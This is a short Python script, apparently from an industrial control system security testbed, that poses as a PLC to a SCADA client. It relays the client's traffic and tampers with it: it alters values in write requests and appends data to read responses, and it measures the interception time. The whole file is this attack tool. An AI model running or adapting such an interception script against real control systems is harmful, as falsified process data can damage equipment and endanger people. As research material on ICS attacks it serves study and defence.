import socket
import time

#PLC target address and port 
#PLC_IP = '127.0.0.1'
PLC_IP = '192.168.0.101'
PLC_PORT = 12345

#Attacker address and port 
#AT_IP ='127.0.0.1'
AT_IP = '192.168.0.102'
AT_PORT = 23456

NO_DATA_IDX =-1

PLCSocket = socket.socket()

def tamper_data(data, PLCSocket, Client):
    time_taken = 0
    start_time = time.time()
    data = data.decode('utf-8')                 
    lst = str(data).split(",")
    #write request 
    if(len(lst)>=2): 
        tdata = tamper_data_w(lst)
        PLCSocket.send(tdata.encode('utf-8'))
        time_taken = (time.time() - start_time)
        res = PLCSocket.recv(1024)                
        print(res)
        Client.send(res)      
    #read request 
    else:        
        PLCSocket.send(data.encode('utf-8'))
        res = PLCSocket.recv(1024)
        res = res.decode('utf-8')
        res = tamper_data_r(res)
        Client.send(res.encode('utf-8'))
        time_taken = (time.time() - start_time)         
    print("MITM time  (a_t1) in seconds :", time_taken) 
    
    

#Modify this code for each case study 
#Tamper write data request
def tamper_data_w(lst):    
    #Just adding one to data     
    lst[1] = lst[1]+"1"        
    #print(lst)
    return lst[0]+","+lst[1]   
        
#Modify this code for each case study 
#Tamper read data request
def tamper_data_r(res):
    return res +"0"

def attacker_program():   
    print("This is Attacker")   
    AttackerSocket = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
    try:
        AttackerSocket.bind((AT_IP, AT_PORT))
    except socket.error as e:
        print(str(e))
    print('Attacker is listening..')
    AttackerSocket.listen(5)  

    Client, address = AttackerSocket.accept()          
    print('Connected to: ' + address[0] + ':' + str(address[1]))
    #inform scada 
    Client.send(str.encode('PLC is working:'))

    try:
        PLCSocket.connect((PLC_IP, PLC_PORT))
    except socket.error as e:
        print(str(e))
    res = PLCSocket.recv(1024)   
    print(res)  
    while True:
        data = Client.recv(2048)        
        if not data:
            break            
        tamper_data(data, PLCSocket, Client)
       
    #ServerSideSocket.close()


if __name__ == '__main__':
    attacker_program()